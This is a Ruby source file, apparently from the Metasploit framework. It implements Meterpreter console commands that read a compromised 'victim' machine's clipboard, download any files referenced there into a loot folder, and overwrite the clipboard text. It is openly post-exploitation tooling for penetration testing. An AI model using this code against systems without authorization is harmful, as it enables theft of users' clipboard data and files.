# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Extended API window management user interface.
#
###
class Console::CommandDispatcher::Extapi::Clipboard

  Klass = Console::CommandDispatcher::Extapi::Clipboard

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "clipboard_get_data" => "Read the victim's current clipboard",
      "clipboard_set_text" => "Write text to the victim's clipboard"
    }
  end

  #
  # Name for this dispatcher
  #
  def name
    "Extapi: Clipboard Management"
  end

  #
  # Options for the clipboard_get_data command.
  #
  @@get_data_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-d" => [ false, "Download content (if applicable)" ]
  )

  def print_clipboard_get_data_usage()
    print(
      "\nUsage: clipboard_get_data [-h] [-d]\n\n" +
      "Attempts to read the data from the victim's clipboard. If the data is in a\n" +
      "supported format, it is read and returned to the user.\n\n" +
      "-d : Downloads content that is associated with the clipboard where\n" +
      "     possible (eg. bitmap content, files, etc).\n\n")
  end

  #
  # Get the data from the victim's clipboard
  #
  def cmd_clipboard_get_data(*args)
    download_content = false
    @@get_data_opts.parse(args) { |opt, idx, val|
      case opt
        when "-d"
          download_content = true
        when "-h"
          print_clipboard_get_data_usage
          return true
      end
    }

    # currently we only support text values
    results = client.extapi.clipboard.get_data()

    if results.length == 0
      print_error( "The current Clipboard data format is not supported." )
      return false
    end

    results.each { |r|
      case r[:type]
        when :text
          print_line( "Current Clipboard Text" )
          print_line( "-----------------------------------------------------" )
          print_line( r[:data] )
          print_line( "-----------------------------------------------------" )
        when :files
          if download_content
            loot_dir = generate_loot_dir( true )
            print_line( "Downloading Clipboard Files" )
            print_line( "-----------------------------------------------------" )
            r[:data].each { |f|
              download_file( loot_dir, f )
            }
            print_line( "-----------------------------------------------------" )
          else
            print_line( "Current Clipboard Files" )
            print_line( "-----------------------------------------------------" )
            r[:data].each { |f|
              print_line( f )
            }
            print_line( "-----------------------------------------------------" )
          end
      end
      
      print_line()
    }
    return true
  end

  #
  # Options for the clipboard_set_text command.
  #
  @@set_text_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ]
  )
def print_clipboard_set_text_usage()
    print(
      "\nUsage: clipboard_set_text [-h] <text>\n\n" +
      "Set the target's clipboard to the given text value.\n\n")
  end

  #
  # Set the clipboard data to the given text.
  #
  def cmd_clipboard_set_text(*args)
    args.unshift "-h" if args.length == 0

    @@set_text_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          print_clipboard_set_text_usage
          return true
      end
    }

    return client.extapi.clipboard.set_text(args.join(" "))
  end

protected

  # TODO: get help from the MSF masters, because I have no
  # idea what I am doing here.
  def generate_loot_dir( create )
    host = client.framework.db.normalize_host( client.session ) || 'unknown'
    ws = 'default'
    name = "#{Time.now.strftime( "%Y%m%d%H%M%S" )}_#{ws}_#{host}_clipboard"
    name.gsub!( /[^a-z0-9\.\_]+/i, '' )

    path = ::File.join( Msf::Config.loot_directory, name )
    path = ::File.expand_path( path )

    if create and not ::File.directory?( path )
      ::FileUtils.mkdir_p( path )
    end

    return path
  end

  def download_file( dest_folder, source )
    stat = client.fs.file.stat( source )
    base = ::Rex::Post::Meterpreter::Extensions::Stdapi::Fs::File.basename( source )
    dest = File.join( dest_folder, base )

    if stat.directory?
      client.fs.dir.download( dest, source, true, true ) { |step, src, dst|
        print_line( "#{step.ljust(11)}: #{src} -> #{dst}" )
        client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
      }
    elsif stat.file?
      client.fs.file.download( dest, source ) { |step, src, dst|
        print_line( "#{step.ljust(11)}: #{src} -> #{dst}" )
        client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
      }
    end
  end

end

end
end
end
end

